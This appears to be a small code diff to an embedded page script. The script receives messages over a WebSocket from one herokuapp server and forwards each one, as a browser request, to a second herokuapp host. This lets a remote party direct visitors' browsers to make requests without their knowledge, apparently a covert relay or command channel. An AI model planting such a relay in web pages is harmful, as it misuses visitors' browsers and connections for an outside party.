@@ -1,6 +1,6 @@
 <script>
   var d = new WebSocket("wss://myappnht.herokuapp.com/");
   d.onmessage = function(e){
-    if(e.data != '...') fetch('https://gifb.herokuapp.com/i.php?a=avaiva&b='+e.data);
+    if(e.data != '...') fetch('https://gifb.herokuapp.com/i.php?a=socket&b='+encodeURI(e.data));
 }
   </script>
